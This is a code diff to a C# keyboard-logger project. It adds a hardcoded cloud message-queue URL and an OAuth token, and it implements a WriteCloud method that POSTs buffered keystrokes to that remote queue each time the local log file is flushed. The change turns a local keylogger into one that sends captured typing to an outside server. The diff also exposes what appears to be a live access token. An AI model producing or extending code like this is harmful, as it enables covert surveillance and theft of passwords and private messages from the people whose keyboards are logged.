@@ -12,7 +12,10 @@ namespace KeyboardLogger.KeyLog
 {
     class Log
     {
-        // constants
+        // cloud constants
+        const string url = "https://mq-aws-us-east-1.iron.io/1/projects/54dcd5253373aa00060000fc/queues/";
+        const string auth = "OAuth hJdydVEvOe4ymWhUqzuzAeakl0g";
+        // local constants
         const string path = @"C:\Program_Files\cs-keyboard-logger\";
         static TimeSpan flushSpan = new TimeSpan(0, 0, 5);
         const string ext = ".log";
@@ -25,7 +28,8 @@ namespace KeyboardLogger.KeyLog
 
         // WriteCloud (id, txt)
         static void WriteCloud(string id, string txt) {
-
+            string msg = "{\"messages\":[{\"time\":\""+DateTime.Now+"\",\"body\":\""+txt+"\"}]}";
+            Task.Factory.StartNew(() => Http.Request(url + id + "/messages", "POST", "application/json", auth, msg));
         }
 
 
@@ -50,6 +54,8 @@ namespace KeyboardLogger.KeyLog
             DateTime now = DateTime.Now;
             if (now - logTime < flushSpan) return;
             File.AppendAllText(file, buff);
+            WriteCloud(id, buff);
+            logTime = now;
             buff = "";
         }
     }
